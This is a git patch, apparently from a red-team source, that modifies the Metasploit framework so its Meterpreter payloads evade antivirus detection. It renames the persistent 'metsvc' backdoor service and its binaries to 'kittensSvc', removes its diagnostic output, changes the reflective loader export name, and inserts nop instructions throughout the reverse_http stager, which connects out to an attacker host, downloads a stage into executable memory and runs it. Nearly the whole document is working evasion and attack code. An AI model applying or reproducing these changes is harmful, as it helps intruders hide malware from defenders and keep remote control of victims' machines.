From cdef390344930b308d48907030ec2b87cdb07029 Mon Sep 17 00:00:00 2001
From: cyberspacekittens <cyberspacekittens@securepla.net>
Date: Sat, 31 Mar 2018 11:52:13 -0700
Subject: [PATCH] kitten changes.

Fixed build.
---
 external/source/metsvc/src/Makefile           |  6 +--
 external/source/metsvc/src/metsvc.cpp         | 42 +--------------
 external/source/metsvc/src/metsvc.h           |  8 +--
 .../payload/windows/meterpreter_loader.rb     | 14 ++++-
 lib/msf/core/payload/windows/reverse_http.rb  | 51 ++++++++++++++++++-
 lib/msf/core/reflective_dll_loader.rb         |  2 +-
 scripts/meterpreter/metsvc.rb                 | 12 ++---
 7 files changed, 78 insertions(+), 57 deletions(-)

diff --git a/external/source/metsvc/src/Makefile b/external/source/metsvc/src/Makefile
index a2994d16638..bd346d15f97 100644
--- a/external/source/metsvc/src/Makefile
+++ b/external/source/metsvc/src/Makefile
@@ -1,9 +1,9 @@
 # vim: set noexpandtab:
 
-CC := cl
+CC := clang-cl
 
-CFLAGS  := /nologo
-LDFLAGS := /nologo
+CFLAGS  :=  -m32 /nologo /machine:x86
+LDFLAGS :=  /nologo /machine:x86
 
 PROGRAMS := metsvc.exe metsvc-server.exe
 SCRIPTS := install.bat
diff --git a/external/source/metsvc/src/metsvc.cpp b/external/source/metsvc/src/metsvc.cpp
index 100a942f3aa..f980b701776 100644
--- a/external/source/metsvc/src/metsvc.cpp
+++ b/external/source/metsvc/src/metsvc.cpp
@@ -57,13 +57,11 @@ int start_meterpreter()
     
     if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
         err = GetLastError();
-        printf("Cannot get module file name (0x%08x)\n", err);
         goto cleanup;
     }
 
     if ((p = strrchr(path, '\\')) == NULL) {
         err = -1;
-        printf("Cannot find directory in module name %s (0x%08x)\n", path, err);
         goto cleanup;
     }
 
@@ -73,7 +71,6 @@ int start_meterpreter()
 
     if (sizeof(path) - strlen(path) < sizeof(METSVC_SERVER)+1) {
         err = -1;
-        printf("Cannot build server filename (0x%08x)\n", err);
         goto cleanup;
     }
     
@@ -86,7 +83,6 @@ int start_meterpreter()
     
 	err = WSAStartup(MAKEWORD(2, 2), &wsa_data);
     if (err != 0) {
-        printf("Cannot initialize Winsock (0x%08x)\n", err);
         goto cleanup;
     }
 
@@ -94,7 +90,6 @@ int start_meterpreter()
 
     if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
         err = WSAGetLastError();
-        printf("Cannot create socket (0x%08x)\n", err);
         goto cleanup;
     }
 
@@ -108,7 +103,6 @@ int start_meterpreter()
 
     if (bind(sock, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) == SOCKET_ERROR) {
         err = WSAGetLastError();
-        printf("Cannot bind to port %d (0x%08x)\n", PORT, err);
         goto cleanup;
     }
 
@@ -116,11 +110,9 @@ int start_meterpreter()
 
     if (listen(sock, SOMAXCONN) == SOCKET_ERROR) {
         err = WSAGetLastError();
-        printf("Cannot listen for incoming connections (0x%08x)\n", err);
         goto cleanup;
     }
 
-    printf("Meterpreter service listening on port %d\n", PORT);
     fflush(stdout);
 
     // Accept incoming connections
@@ -134,12 +126,9 @@ int start_meterpreter()
         if ((conn = accept(sock, (struct sockaddr*)&peer, &peer_len)) == INVALID_SOCKET) {
             if ((err = WSAGetLastError()) == WSAECONNRESET)
                 continue;
-            printf("Cannot accept an incomming connection (0x%08x)\n", err);
             goto cleanup;
         }
 
-        printf("Received connection from %s\n",
-            inet_ntoa(peer.sin_addr));
         fflush(stdout);
 
         // Build the metsrv server command line
@@ -149,7 +138,6 @@ int start_meterpreter()
 
         if (len < 0 || len == sizeof(cmd)) {
             err = -1;
-            printf("Cannot build the metsrv server command line (0x%08x)\n", err);
             goto cleanup;
         }
         
@@ -167,7 +155,6 @@ int start_meterpreter()
                           NULL, &startup_info, &process_information) == 0)
         {
             err = GetLastError();
-            printf("Cannot start the metsrv server %s (0x%08x)\n", path, err);
             goto cleanup;
         }
 
@@ -204,7 +191,6 @@ VOID WINAPI ServiceCtrlHandler(DWORD fdwControl)
     }
 
     if (SetServiceStatus(hStatus, &status) == 0) {
-        printf("Cannot set service status (0x%08x)\n", GetLastError());
         exit(1);
     }
 
@@ -223,7 +209,6 @@ VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
     hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
 
     if (hStatus == 0) {
-        printf("Cannot register service handler (0x%08x)\n", GetLastError());
         exit(1);
     }
 
@@ -238,7 +223,6 @@ VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
     status.dwWaitHint = 0;
 
     if (SetServiceStatus(hStatus, &status) == 0) {
-        printf("Cannot set service status (0x%08x)\n", GetLastError());
         return;
     }
 
@@ -252,7 +236,6 @@ VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
         status.dwServiceSpecificExitCode = 0;
 
         if (SetServiceStatus(hStatus, &status) == 0) {
-            printf("Cannot set service status (0x%08x)\n", GetLastError());
         }
     }
 
@@ -274,7 +257,6 @@ BOOL install_service()
     // Get the current module name
 
     if (!GetModuleFileName(NULL, path, MAX_PATH)) {
-        printf("Cannot get module name (0x%08x)\n", GetLastError());
         return FALSE;
     }
 
@@ -284,7 +266,6 @@ BOOL install_service()
     int len = _snprintf(cmd, sizeof(cmd), "\"%s\" service", path);
 
     if (len < 0 || len == sizeof(cmd)) {
-        printf("Cannot build service command line (0x%08x)\n", -1);
         return FALSE;
     }
 
@@ -293,11 +274,9 @@ BOOL install_service()
     hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
 
     if (hSCManager == NULL) {
-        printf("Cannot open service manager (0x%08x)\n", GetLastError());
         return FALSE;
     }
 
-    printf(" * Installing service %s\n", SERVICE_NAME);
     fflush(stdout);
 
     // Create the service
@@ -319,15 +298,12 @@ BOOL install_service()
     );
 
     if (hService == NULL) {
-        printf("Cannot create service (0x%08x)\n", GetLastError());
-
         CloseServiceHandle(hSCManager);
         return FALSE;
     }
 
     // Start the service
 
-    printf(" * Starting service\n");
     fflush(stdout);
     
     char* args[] = { path, "service" };
@@ -336,8 +312,6 @@ BOOL install_service()
         DWORD err = GetLastError();
 
         if (err != ERROR_SERVICE_ALREADY_RUNNING) {
-            printf("Cannot start service %s (0x%08x)\n", SERVICE_NAME, err);
-
             CloseServiceHandle(hService);
             CloseServiceHandle(hSCManager);
             return FALSE;
@@ -349,7 +323,6 @@ BOOL install_service()
     CloseServiceHandle(hService);
     CloseServiceHandle(hSCManager);
 
-    printf("Service %s successfully installed.\n", SERVICE_NAME);
     fflush(stdout);
     
     return TRUE;
@@ -372,7 +345,6 @@ BOOL remove_service()
     hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
 
     if (hSCManager == NULL) {
-        printf("Cannot open service manager (0x%08x)\n", GetLastError());
         return FALSE;
     }
 
@@ -381,36 +353,27 @@ BOOL remove_service()
     hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_STOP | DELETE);
 
     if (hService == NULL) {
-        printf("Cannot open service %s (0x%08x)\n", SERVICE_NAME, GetLastError());
 
         CloseServiceHandle(hSCManager);
         return FALSE;
     }
 
     // Stop the service
-
-    printf(" * Stopping service %s\n", SERVICE_NAME);
     fflush(stdout);
     
     if (ControlService(hService, SERVICE_CONTROL_STOP, &status) == 0) {
         err = GetLastError();
 
         if (err != ERROR_SERVICE_NOT_ACTIVE) {
-            printf("Cannot stop service %s (0x%08x)\n", SERVICE_NAME, err);
-
             CloseServiceHandle(hSCManager);
             return FALSE;
         }
     }
 
     // Delete the service
-
-    printf(" * Removing service\n");
     fflush(stdout);
     
     if (DeleteService(hService) == 0) {
-        printf("Cannot delete service %s (0x%08x)\n", SERVICE_NAME);
-        
         CloseServiceHandle(hSCManager);
         return FALSE;
     }
@@ -419,8 +382,7 @@ BOOL remove_service()
 
     CloseServiceHandle(hService);
     CloseServiceHandle(hSCManager);
-
-    printf("Service %s successfully removed.\n", SERVICE_NAME);
+    
     fflush(stdout);
 
     return TRUE;
@@ -440,8 +402,6 @@ void start_service()
     };
 
     if (StartServiceCtrlDispatcher(ServiceTable) == 0) {
-        printf("Cannot start the service control dispatcher (0x%08x)\n",
-            GetLastError());
         exit(1);
     }
 }
diff --git a/external/source/metsvc/src/metsvc.h b/external/source/metsvc/src/metsvc.h
index 1858111d148..73199252893 100644
--- a/external/source/metsvc/src/metsvc.h
+++ b/external/source/metsvc/src/metsvc.h
@@ -28,7 +28,7 @@
  */
 
 #define PORT          31337
-#define SERVICE_NAME  "metsvc"
-#define DISPLAY_NAME  "Meterpreter"
-#define METSVC_SERVER "metsvc-server.exe"
-#define METSRV_DLL    "metsrv.dll"
+#define SERVICE_NAME  "kittensSvc"
+#define DISPLAY_NAME  "Kittens"
+#define METSVC_SERVER "kittensSvc-server.exe"
+#define METSRV_DLL    "kittensSvc.dll"
\ No newline at end of file
diff --git a/lib/msf/core/payload/windows/meterpreter_loader.rb b/lib/msf/core/payload/windows/meterpreter_loader.rb
index 98824221e36..36a4dfa34ff 100644
--- a/lib/msf/core/payload/windows/meterpreter_loader.rb
+++ b/lib/msf/core/payload/windows/meterpreter_loader.rb
@@ -37,16 +37,26 @@ def asm_invoke_metsrv(opts={})
     asm = %Q^
         ; prologue
           dec ebp               ; 'M'
+          nop
+          nop
           pop edx               ; 'Z'
+          nop
+          nop
           call $+5              ; call next instruction
           pop ebx               ; get the current location (+7 bytes)
           push edx              ; restore edx
+          nop
+          nop
           inc ebp               ; restore ebp
           push ebp              ; save ebp for later
           mov ebp, esp          ; set up a new stack frame
-        ; Invoke ReflectiveLoader()
+          ; Invoke ReflectiveLoader()
+          nop
+          nop
           ; add the offset to ReflectiveLoader() (0x????????)
           add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
+          nop
+          nop
           call ebx              ; invoke ReflectiveLoader()
         ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
           ; offset from ReflectiveLoader() to the end of the DLL
@@ -62,6 +72,8 @@ def asm_invoke_metsrv(opts={})
     asm << %Q^
           push ebx              ; push the pointer to the configuration start
           push 4                ; indicate that we have attached
+          nop
+          nop
           push eax              ; push some arbitrary value for hInstance
           call eax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
     ^
diff --git a/lib/msf/core/payload/windows/reverse_http.rb b/lib/msf/core/payload/windows/reverse_http.rb
index eedf4cfab0f..ce74b04d246 100644
--- a/lib/msf/core/payload/windows/reverse_http.rb
+++ b/lib/msf/core/payload/windows/reverse_http.rb
@@ -249,9 +249,13 @@ def asm_reverse_http(opts={})
       load_wininet:
         push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
         push 0x696e6977        ; ...
+        nop
+        nop
         push esp               ; Push a pointer to the "wininet" string on the stack.
         push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call ebp               ; LoadLibraryA( "wininet" )
+        nop
+        nop
         xor ebx, ebx           ; Set ebx to NULL to use in future arguments
     ^
 
@@ -260,12 +264,16 @@ def asm_reverse_http(opts={})
       internetopen:
         push ebx               ; DWORD dwFlags
         push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
+        nop
+        nop
       call get_proxy_server
         db "#{proxy_info}", 0x00
       get_proxy_server:
                                ; LPCTSTR lpszProxyName (via call)
         push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
         push ebx               ; LPCTSTR lpszAgent (NULL)
+        nop
+        nop
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
         call ebp
       ^
@@ -275,8 +283,12 @@ def asm_reverse_http(opts={})
         push ebx               ; DWORD dwFlags
         push ebx               ; LPCTSTR lpszProxyBypass (NULL)
         push ebx               ; LPCTSTR lpszProxyName (NULL)
+        nop
+        nop
         push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
         push ebx               ; LPCTSTR lpszAgent (NULL)
+        nop
+        nop
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
         call ebp
       ^
@@ -286,10 +298,14 @@ def asm_reverse_http(opts={})
       internetconnect:
         push ebx               ; DWORD_PTR dwContext (NULL)
         push ebx               ; dwFlags
+        nop
+        nop
         push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
         push ebx               ; password (NULL)
         push ebx               ; username (NULL)
         push #{opts[:port]}    ; PORT
+        nop
+        nop
         call got_server_uri    ; double call to get pointer for both server_uri and
       server_uri:              ; server_host; server_uri is saved in EDI for later
         db "#{opts[:url]}", 0x00
@@ -297,6 +313,8 @@ def asm_reverse_http(opts={})
         push eax               ; HINTERNET hInternet (still in eax from InternetOpenA)
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}
         call ebp
+        nop
+        nop
         mov esi, eax           ; Store hConnection in esi
     ^
 
@@ -307,6 +325,8 @@ def asm_reverse_http(opts={})
       asm << %Q^
         ; DWORD dwBufferLength (length of username)
         push #{proxy_user.length}
+        nop
+        nop
         call set_proxy_username
       proxy_username:
         db "#{proxy_user}",0x00
@@ -314,6 +334,8 @@ def asm_reverse_http(opts={})
                              ; LPVOID lpBuffer (username from previous call)
         push 43              ; DWORD dwOption (INTERNET_OPTION_PROXY_USERNAME)
         push esi             ; hConnection
+        nop
+        nop
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call ebp
       ^
@@ -342,9 +364,13 @@ def asm_reverse_http(opts={})
         push ebx               ; accept types
         push ebx               ; referrer
         push ebx               ; version
+        nop
+        nop
         push edi               ; server URI
         push ebx               ; method
         push esi               ; hConnection
+        nop
+        nop
         push #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}
         call ebp
         xchg esi, eax          ; save hHttpRequest in esi
@@ -370,6 +396,8 @@ def asm_reverse_http(opts={})
        mov eax, esp
         push 4                 ; sizeof(dwFlags)
         push eax               ; &dwFlags
+        nop
+        nop
         push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
         push esi               ; hHttpRequest
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
@@ -381,12 +409,16 @@ def asm_reverse_http(opts={})
       httpsendrequest:
         push ebx               ; lpOptional length (0)
         push ebx               ; lpOptional (NULL)
+        nop
+        nop
     ^
 
     if custom_headers
       asm << %Q^
         push -1                ; dwHeadersLength (assume NULL terminated)
         call get_req_headers   ; lpszHeaders (pointer to the custom headers)
+        nop
+        nop
         db #{custom_headers}
       get_req_headers:
       ^
@@ -401,12 +433,16 @@ def asm_reverse_http(opts={})
         push esi               ; hHttpRequest
         push #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}
         call ebp
+        nop
+        nop
         test eax,eax
         jnz allocate_memory
 
      set_wait:
         push #{retry_wait}     ; dwMilliseconds
         push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
+        nop
+        nop
         call ebp               ; Sleep( dwMilliseconds );
       ^
 
@@ -445,6 +481,9 @@ def asm_reverse_http(opts={})
       push 0x40              ; PAGE_EXECUTE_READWRITE
       push 0x1000            ; MEM_COMMIT
       push 0x00400000        ; Stage allocation (4Mb ought to do us)
+      nop
+      nop
+      
       push ebx               ; NULL as we dont care where the allocation is
       push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
       call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
@@ -452,6 +491,9 @@ def asm_reverse_http(opts={})
     download_prep:
       xchg eax, ebx          ; place the allocated base address in ebx
       push ebx               ; store a copy of the stage base address on the stack
+      nop
+      nop
+      
       push ebx               ; temporary storage for bytes read count
       mov edi, esp           ; &bytesRead
 
@@ -459,16 +501,23 @@ def asm_reverse_http(opts={})
       push edi               ; &bytesRead
       push 8192              ; read length
       push ebx               ; buffer
+      nop
+      nop
+      
       push esi               ; hRequest
       push #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
       call ebp
 
       test eax,eax           ; download failed? (optional?)
       jz failure
+      nop
+      nop
 
       mov eax, [edi]
       add ebx, eax           ; buffer += bytes_received
-
+      nop
+      nop
+        
       test eax,eax           ; optional?
       jnz download_more      ; continue until it returns 0
       pop eax                ; clear the temporary storage
diff --git a/lib/msf/core/reflective_dll_loader.rb b/lib/msf/core/reflective_dll_loader.rb
index 848da4ba931..d12a9e70f88 100644
--- a/lib/msf/core/reflective_dll_loader.rb
+++ b/lib/msf/core/reflective_dll_loader.rb
@@ -53,7 +53,7 @@ def parse_pe(dll)
     offset = nil
 
     pe.exports.entries.each do |e|
-      if e.name =~ /^\S*ReflectiveLoader\S*/
+      if e.name =~ /^\S*KittensLoader\S*/
         offset = pe.rva_to_file_offset(e.rva)
         break
       end
diff --git a/scripts/meterpreter/metsvc.rb b/scripts/meterpreter/metsvc.rb
index 6c277d9f155..d1ff48dfe15 100644
--- a/scripts/meterpreter/metsvc.rb
+++ b/scripts/meterpreter/metsvc.rb
@@ -82,9 +82,9 @@ def m_exec(session, cmd)
   # such as metsrv can be copied from the appropriate location
   # but named correctly on the target.
   bins = {
-    'metsrv.x86.dll'    => 'metsrv.dll',
-    'metsvc-server.exe' => nil,
-    'metsvc.exe'        => nil
+    'metsrv.x86.dll'    => 'kittensSvc.dll',
+    'metsvc-server.exe' => 'kittensSvc-server.exe',
+    'metsvc.exe'        => 'kittensSvc.exe'
   }
 
   bins.each do |from, to|
@@ -103,17 +103,17 @@ def m_exec(session, cmd)
   if(not remove)
     print_status("Starting the service...")
     client.fs.dir.chdir(tempdir)
-    data = m_exec(client, "metsvc.exe install-service")
+    data = m_exec(client, "kittensSvc.exe install-service")
     print_line("\t#{data}")
   else
     print_status("Stopping the service...")
     client.fs.dir.chdir(tempdir)
-    data = m_exec(client, "metsvc.exe remove-service")
+    data = m_exec(client, "kittensSvc.exe remove-service")
     print_line("\t#{data}")
   end
 
   if(remove)
-    m_exec(client, "cmd.exe /c del metsvc.exe")
+    m_exec(client, "cmd.exe /c del kittensSvc.exe")
   end
 
   #
